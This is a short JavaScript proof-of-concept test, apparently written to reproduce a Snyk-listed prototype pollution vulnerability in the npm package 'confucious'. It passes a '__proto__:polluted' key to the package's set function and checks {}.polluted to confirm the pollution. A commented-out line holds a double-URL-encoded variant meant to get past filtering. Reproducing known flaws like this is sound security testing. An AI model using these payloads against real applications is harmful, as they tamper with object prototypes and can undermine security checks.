// //https://snyk.io/vuln/SNYK-JS-CONFUCIOUS-598665
// test("prototype pollution in confucious", () => {
console.log({}.polluted);

  const confucious = require("confucious");
  confucious.set("__proto__:polluted", "yes");
  //confucious.set("%255f%255fproto%255f%255f:polluted", "yes");

console.log({}.polluted);
// });
